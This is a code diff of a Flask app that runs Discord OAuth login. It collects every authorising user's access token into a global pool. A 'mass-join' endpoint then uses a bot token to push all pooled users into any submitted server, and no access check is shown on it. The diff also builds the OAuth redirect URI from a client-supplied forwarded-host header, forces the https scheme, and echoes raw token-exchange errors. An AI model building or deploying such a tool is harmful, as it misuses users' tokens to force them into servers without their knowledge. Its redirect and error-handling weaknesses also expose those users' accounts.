@@ -6,12 +6,9 @@ import os
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# Configuration - Replace with your Discord Developer credentials or Render Environment Variables
 CLIENT_ID = os.environ.get("CLIENT_ID", "YOUR_CLIENT_ID")
 CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "YOUR_CLIENT_SECRET")
-REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://YOUR-RENDER-APP.onrender.com/callback")
 
-# Database placeholder storing authorized user access tokens and info
 AUTHORIZED_USERS = []
 
 LOGIN_PAGE = """<!DOCTYPE html>
@@ -73,10 +70,21 @@ DASHBOARD_PAGE = """<!DOCTYPE html>
 </html>
 """
 
+def get_redirect_uri():
+    # Automatically forces https for Render deployments
+    host = request.headers.get("X-Forwarded-Host", request.host)
+    if "onrender.com" in host or "https" in request.headers.get("X-Forwarded-Proto", ""):
+        return f"https://{host}/callback"
+    return f"http://{host}/callback"
+
+@app.before_request
+def force_https():
+    request.environ['wsgi.url_scheme'] = 'https'
+
 @app.route("/")
 def index():
     if "user_token" not in session:
-        return render_template_string(LOGIN_PAGE, client_id=CLIENT_ID, redirect_uri=REDIRECT_URI)
+        return render_template_string(LOGIN_PAGE, client_id=CLIENT_ID, redirect_uri=get_redirect_uri())
     return render_template_string(DASHBOARD_PAGE, username=session.get("username", "Agent"), msg=request.args.get("msg", ""))
 
 @app.route("/callback")
@@ -85,31 +93,28 @@ def callback():
     if not code:
         return redirect("/")
     
-    # Exchange code for User Access Token
     data = {
         "client_id": CLIENT_ID,
         "client_secret": CLIENT_SECRET,
         "grant_type": "authorization_code",
         "code": code,
-        "redirect_uri": REDIRECT_URI
+        "redirect_uri": get_redirect_uri()
     }
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
     
     if res.status_code != 200:
-        return "Authorization failed!", 400
+        return f"Authorization failed: {res.text}", 400
     
     token_data = res.json()
     access_token = token_data.get("access_token")
     
-    # Fetch User Profile
     user_res = requests.get("https://discord.com/api/users/@me", headers={"Authorization": f"Bearer {access_token}"})
     if user_res.status_code == 200:
         user_info = user_res.json()
         session["user_token"] = access_token
         session["username"] = user_info.get("username")
         
-        # Save user token and ID to our global pool for mass joining later
         user_entry = {"id": user_info.get("id"), "token": access_token}
         if user_entry not in AUTHORIZED_USERS:
             AUTHORIZED_USERS.append(user_entry)
@@ -119,11 +124,10 @@ def callback():
 @app.route("/mass-join", methods=["POST"])
 def mass_join():
     guild_id = request.form.get("guild_id")
-    bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_WITH_CREATE_INSTANT_INVITE")
+    bot_token = os.environ.get("BOT_TOKEN", "")
     
     success_count = 0
     for u in AUTHORIZED_USERS:
-        # Using the guilds.join API endpoint to push users into the server using bot token + user access token
         url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{u['id']}"
         headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}
         payload = {"access_token": u['token']}
